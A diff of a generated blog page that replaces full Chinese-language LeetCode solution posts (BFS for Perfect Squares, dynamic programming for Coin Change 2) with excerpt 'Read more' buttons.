-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">       7</span><br><span class="line">     /	\</span><br><span class="line">    6	 3</span><br><span class="line">   /\	  \</span><br><span class="line">  5  2     2  </span><br><span class="line"> / \  \    /</span><br><span class="line">4  1   1   1</span><br><span class="line"> \</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
-
-<p>每一层代表从上一层结点减去一个<code>Perfect Square</code>后的结果，显然最早产生叶子节点的层次为最短路径，也就是<code>n</code>中含有的<code>Perfect Square</code>的最少数量。</p>
-<p>BFS的思路比较简单，主要需注意三部分：</p>
-<ol>
-<li>利用”先进先出”队列存储结点</li>
-<li>先弹出队头结点，再依次推入子结点</li>
-<li>利用<code>visited</code>数组保存已记录结点，起到剪枝效果</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numSquares</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="comment"># BFS</span></span><br><span class="line">        deq = deque()</span><br><span class="line">        deq.append((n, <span class="number">0</span>))  <span class="comment"># (amount, step)</span></span><br><span class="line">        visited = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(deq):</span><br><span class="line">            amount, step = deq.popleft()</span><br><span class="line">            index = <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> amount - index ** <span class="number">2</span> &gt;= <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> amount - index ** <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> step + <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> amount - index ** <span class="number">2</span> <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">                    deq.append((amount - index ** <span class="number">2</span>, step + <span class="number">1</span>))</span><br><span class="line">                    visited.add(amount - index ** <span class="number">2</span>)</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/11/LeetCode-0279-Perfect-Squares/6.jpg"></p>
-<p align="right"><strong>致谢：小鹿同学</strong></p>
-
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/06/11/LeetCode-0279-Perfect-Squares/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1161,7 +1119,14 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">self, amount: <span class="built_in">int</span>, coins: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        memo = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, amount + <span class="number">1</span>)]</span><br><span class="line">        memo[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> coins:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(c, amount + <span class="number">1</span>):</span><br><span class="line">                memo[i] += memo[i - c]</span><br><span class="line">        <span class="keyword">return</span> memo[amount]</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/06/10/LeetCode-0518-Coin-Change-2/1.jpg"></p>
-<p align="right"><strong>致谢：小鹿同学</strong></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/06/10/LeetCode-0518-Coin-Change-2/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
